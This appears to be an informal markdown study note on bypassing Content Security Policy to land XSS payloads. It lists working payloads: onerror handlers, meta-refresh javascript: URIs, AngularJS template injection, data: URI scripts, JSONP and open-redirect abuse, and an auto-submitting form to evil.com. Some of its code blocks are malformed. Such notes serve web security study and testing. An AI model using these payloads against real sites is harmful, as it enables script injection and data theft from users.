#  CSP Bypass & Sandbox Escapes"
`CSP` = Content Security Policy
- A defense header websites set to control what  `JS` , `CSS`, or content can load.

  ## How a content security policy looks like
  ```js
  Content-Security-Policy: script-src 'self' https://trusted.cdn.com
  ```
This means:
> No `<script>alert(1)</script>`
> No `eval()`, no new `function()` and no `javascript:` URIs
> And allso no external scrips unless from `trusted cdn`
something like `only allow scripts from here and block the rest`

## Why youd need to bypass CSP
> If you find a vulnerable site to `XSS` but the `CSP` prevents you from dropping your payload
```js
<script>alert(1)</script>
```
Then, youll need to bypass CSP to drop your payload::
## What to do
1. Using Js functions allowed by CSP
   > If the site is strict on you using `script-src` sometimes, `style-src` or `img-src` works
   ```js
   <svg/onload=alert(1)> <img src=x onerror=alert(1)>
   ```
   or
   ```js
   <meta http-equiv="refresh" content="0;url=javascript:alert(1)">
   ```
   Tells the browser to:
   - auto redirect after 0 secs
   - If `javascript:` is allowed, it will trigger an alert
3. injecting inside script templates or Angular JS templates
    ```js
    <script type="text/ng-template"> 
    {{constructor.constructor('alert(1)')()}}
    </script>
    > This works sometimes because `CSP` only blocks `raw script execution` , not template execution.
    ```
4. Abuse `data:` or `blob:` URIs if allowed
   They are inline ways of embedding scripts or files:
    ```js
   script-src data:
   ```
     Then u can inject:
   
   ```js
   <script src="data:text/javascript,alert(1)"></script>
6. Use `JSONP` or `Open Redirects`
   JSONP (JSON with Padding) is an old technique that lets you call a remote API and get JS returned directly like this:
   ```js
   <script src="https://trusted.com/api?callback=alert"></script>
  ``` ```
  If the site reflects your call back param like:
  ```js
  alert({"data":"someData"});
  ```
  Or If `CSP` allows `script-src *.trusted.com`, this works like gold
  > Open Redirect
    It's when a trusted domain (that CSP allows) lets you redirect anywhere using a param:
    ```js
    https://trusted.com/redirect?to=https://attacker.com
    ```
    Then you inject:
    ```js
    <script src="https://trusted.com/redirect?to=javascript:alert(1)"></script>
    ```
7. Bypass Sandbox with form submission
```js
<form action="https://evil.com" method="POST">
  <input type="submit" id="send">
</form>

<script>
  document.getElementById("send").click();
</script>
